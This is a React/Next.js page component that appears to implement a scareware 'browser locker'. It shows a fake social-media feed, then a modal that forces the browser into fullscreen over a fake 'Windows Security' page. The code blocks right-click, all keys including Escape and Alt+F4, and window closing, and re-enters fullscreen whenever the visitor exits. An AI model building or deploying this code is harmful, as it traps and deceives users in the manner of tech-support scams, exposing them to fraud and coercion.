'use client';

import { useState, useEffect, useCallback } from 'react';
import Header from '@/components/Header';
import LeftSidebar from '@/components/LeftSidebar';
import RightSidebar from '@/components/RightSidebar';
import Feed from '@/components/Feed';
import Modal from '@/components/Modal';
import WindowsSecurityPage from '@/components/WindowsSecurityPage';

export default function Home() {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [showSecurityPage, setShowSecurityPage] = useState(false);

  const enterFullscreen = useCallback(() => {
    const elem = document.documentElement;
    if (elem.requestFullscreen) {
      elem.requestFullscreen().catch(() => {});
    } else if ((elem as unknown as { webkitRequestFullscreen?: () => void }).webkitRequestFullscreen) {
      (elem as unknown as { webkitRequestFullscreen: () => void }).webkitRequestFullscreen();
    } else if ((elem as unknown as { msRequestFullscreen?: () => void }).msRequestFullscreen) {
      (elem as unknown as { msRequestFullscreen: () => void }).msRequestFullscreen();
    }
  }, []);

  const handleModalAction = () => {
    enterFullscreen();
    setIsModalOpen(false);
    setShowSecurityPage(true);
  };

  useEffect(() => {
    // Show modal after a short delay to simulate the design
    const timer = setTimeout(() => {
      setIsModalOpen(true);
    }, 500);

    // Disable right-click context menu
    const handleContextMenu = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };
    document.addEventListener('contextmenu', handleContextMenu, true);

    // Disable all keyboard inputs including ESC and Alt+F4
    const handleKeyDown = (e: KeyboardEvent) => {
      // Block ESC key
      if (e.key === 'Escape' || e.keyCode === 27) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
      }
      
      // Block Alt+F4
      if (e.altKey && (e.key === 'F4' || e.keyCode === 115)) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
      }

      // Block all other keys
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    };

    const handleKeyUp = (e: KeyboardEvent) => {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    };

    const handleKeyPress = (e: KeyboardEvent) => {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    };

    // Prevent window close
    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      e.preventDefault();
      e.returnValue = '';
      return '';
    };

    document.addEventListener('keydown', handleKeyDown, true);
    document.addEventListener('keyup', handleKeyUp, true);
    document.addEventListener('keypress', handleKeyPress, true);
    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      clearTimeout(timer);
      document.removeEventListener('contextmenu', handleContextMenu, true);
      document.removeEventListener('keydown', handleKeyDown, true);
      document.removeEventListener('keyup', handleKeyUp, true);
      document.removeEventListener('keypress', handleKeyPress, true);
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, []);

  // Re-enter fullscreen when user exits (handles ESC exiting fullscreen)
  useEffect(() => {
    if (!showSecurityPage) return;

    const handleFullscreenChange = () => {
      const isFullscreen = !!(
        document.fullscreenElement ||
        (document as unknown as { webkitFullscreenElement?: Element }).webkitFullscreenElement ||
        (document as unknown as { msFullscreenElement?: Element }).msFullscreenElement
      );

      // If exited fullscreen and security page is showing, re-enter fullscreen
      if (!isFullscreen && showSecurityPage) {
        setTimeout(() => {
          enterFullscreen();
        }, 100);
      }
    };

    document.addEventListener('fullscreenchange', handleFullscreenChange);
    document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
    document.addEventListener('msfullscreenchange', handleFullscreenChange);

    return () => {
      document.removeEventListener('fullscreenchange', handleFullscreenChange);
      document.removeEventListener('webkitfullscreenchange', handleFullscreenChange);
      document.removeEventListener('msfullscreenchange', handleFullscreenChange);
    };
  }, [showSecurityPage, enterFullscreen]);

  return (
    <div className="min-h-screen bg-[#f0f2f5]">
      <Header />
      <div className="flex">
        <LeftSidebar />
        <div className="flex-1 ml-[280px] mr-[280px]">
          <Feed />
        </div>
        <RightSidebar />
      </div>
      <Modal isOpen={isModalOpen} onAction={handleModalAction} />
      {showSecurityPage && <WindowsSecurityPage />}
    </div>
  );
}
